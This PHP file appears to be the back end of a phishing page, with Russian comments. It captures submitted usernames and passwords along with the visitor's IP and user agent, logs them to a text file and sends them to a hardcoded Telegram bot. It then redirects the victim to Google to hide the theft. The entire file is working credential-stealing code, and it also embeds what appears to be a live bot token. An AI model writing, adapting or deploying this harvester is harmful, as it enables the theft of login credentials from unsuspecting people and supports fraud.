<?php

$TOKEN = "8121123464:AAHG_dJQyPTcPCIx-vCMmFv6IdoDlSRkWHk";
$CHAT_ID = "860389338";
$TELEBOT_API = "https://api.telegram.org/bot{$TOKEN}/sendMessage";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $ip = $_SERVER['REMOTE_ADDR'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $username = $_POST['username'];
    $password = $_POST['password'];

    $log = "IP: $ip\nUA: $useragent\nLogin: $username\nPassword: $password\n------------------\n";
    file_put_contents("ip_log.txt", $log, FILE_APPEND);

    // Сообщение
    $message = "🛑 Новая попытка авторизации\n\n👤 Login: $username\n🔑 Password: $password\n🌐 IP: $ip\n📱 UA: $useragent";

    // Отправка через curl
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $TELEBOT_API);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id' => $CHAT_ID,
        'text' => $message,
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    header("Location: https://google.com");
    exit();
}
?>
